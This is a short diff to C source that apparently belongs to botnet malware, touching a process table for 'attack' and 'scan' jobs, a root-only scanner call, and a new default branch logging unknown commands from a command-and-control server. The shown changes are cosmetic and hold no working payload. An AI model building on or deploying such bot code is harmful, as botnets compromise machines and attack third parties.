@@ -8,9 +8,9 @@ It also keeps track what's enabled and stuff so yeh
 
 struct procinfo_t
 {
-	bool enabled; // Can it be used again?
-	int32_t pid;     // Process id
-	uint8_t type;    // Attack? Scan? What type of process is it
+	bool enabled; 	// Can it be used again?
+	int32_t pid;	// Process id
+	uint8_t type;	// Attack? Scan? What type of process is it
 };
 
 struct proc_t
@@ -74,7 +74,7 @@ int proc_add(int type, char *param)
 			if (proc_isroot == true)
 				scan_scanner();
 			else
-				printd("u can't fucking do that u need root");
+				printd("u can't do that u need root");
 			break;
 		}
 		case 2:
@@ -88,6 +88,11 @@ int proc_add(int type, char *param)
 		}
 		case 4:
 		{
+			break;
+		}
+		default:
+		{
+			printd("Unknown function called by C&C");
 			break;
 		}
 	}
